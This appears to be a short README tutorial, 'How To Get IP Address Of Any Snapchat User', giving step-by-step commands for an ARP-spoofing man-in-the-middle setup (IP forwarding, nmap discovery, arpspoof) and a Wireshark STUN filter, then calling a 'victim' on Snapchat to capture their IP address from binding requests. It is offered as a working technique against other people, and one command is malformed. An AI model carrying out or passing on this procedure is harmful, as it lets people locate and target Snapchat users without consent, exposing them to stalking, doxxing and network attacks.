# How-To-Get-IP-Address-Of-Any-Snapchat-User
How To Get IP Address Of Any Snapchat User



👨‍💻Easy MITM Attack

📜Required:
- Mac OS X / Kali Linux   ( Or Any UNIX )
- A Phone Where You Have Snapchat On ( Im Assuming Its A Phone )
- Nmap
- Some Tools And Little MITM Knowledge !

👨‍🏫Here Is The Tut:

🌀Download Wireshark Here
 (https://www.wireshark.org/)🌀Download Arpspoof Here (https://github.com/SuperMarcus/macos-arpspoof)  - MACOS only - Kali Linux Has This Already!

1. Fire Up Terminal And Ip Forward Your Laptop/pc With This Scripts:
Kali -   sudo sysctl net.ipv4.ip_forward = 1 
            sudo net.ipv4.ip_forward = 1
Mac -  sudo sysctl -w net.inet.ip.forwarding=1

2. Find Your Phone Device Local Ip And Write It Down.
      Nmap -sn <gateway ip>/24
Ex. nmap -sn (or -sP) 192.168.0.1/24

3. Spoof Your Phone.
         arpspoof -i <interface> -t <phone ip> gateway
Ex(mac):  arpspoof -i en0 -t 192.168.0.160 192.168.0.1

4. Fire up wireshark and filter On Your Phone Ip With Stun Protocol
   ip.addr == <phone ip> && stun
Ex: ip.addr == 192.168.0.160 && stun

5. Call Your Victim On Snap And Keep Calling Him For Around 5 Seconds.

🌀They Do Not Need Necessary To Answer
You Will See On Wireshark Some Binding Requests,  Then Some Other Stun Ones.

